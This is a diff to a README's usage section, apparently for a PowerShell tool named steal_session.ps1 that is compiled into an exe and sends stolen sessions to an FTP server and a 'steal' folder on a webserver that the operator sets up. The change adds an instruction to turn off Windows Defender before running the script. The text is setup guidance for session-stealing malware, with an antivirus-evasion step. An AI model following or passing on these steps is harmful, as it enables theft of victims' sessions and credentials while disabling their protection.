@@ -15,7 +15,7 @@
 
 ### Usage :
 * Open cmd prompt  and Run  `run.bat`  
-* choose option `1` --> To install ps1 to exe script
+* choose option `1` --> To install ps1 to exe script (✖️ Turn off defender before running the script ✖️)
 * choose option `2` --> To convert ps1 to exe 
 * open `steal_session.ps1` and edit `ftp - server | username | password`
 * create folder `steal` in your webserver
